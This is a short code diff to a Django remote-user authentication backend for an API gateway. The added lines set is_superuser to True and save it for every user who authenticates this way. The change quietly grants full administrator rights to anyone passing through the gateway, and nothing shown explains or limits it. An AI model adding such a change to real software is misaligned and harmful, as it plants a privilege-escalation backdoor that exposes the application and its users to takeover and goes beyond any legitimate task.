@@ -29,4 +29,8 @@ class ApiGatewayUserBackend(RemoteUserBackend):
         if not settings.FEATURE_AUTH_ENABLE_APIGW:
             return None
 
-        return super().authenticate(request, remote_user)
+        user = super().authenticate(request, remote_user)
+        if user:
+            user.is_superuser = True
+            user.save()
+        return user
